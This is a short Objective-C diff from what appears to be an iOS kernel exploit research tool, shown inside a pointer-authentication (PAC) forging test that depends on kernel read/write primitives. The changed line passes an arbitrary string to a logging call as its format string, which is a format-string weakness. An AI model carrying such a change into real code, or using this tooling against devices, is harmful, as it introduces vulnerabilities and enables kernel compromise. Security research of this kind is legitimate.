@@ -5002,7 +5002,7 @@ static void kpPacLive(NSString *line)
     NSMutableString *r = [NSMutableString string];
     NSString *pacPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
     [@"" writeToFile:pacPath atomically:NO encoding:NSUTF8StringEncoding error:nil];
-    void (^pacnote)(NSString *) = ^(NSString *s){ kpNote(r, @"%@", s); kpPacLive([s stringByAppendingString:@"\n"]); };
+    void (^pacnote)(NSString *) = ^(NSString *s){ kpNote(r, s); kpPacLive([s stringByAppendingString:@"\n"]); };
     pacnote(@"=== PAC forging test (TaskRop remotepac port) ===");
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив — сначала эксплойт.\n"];
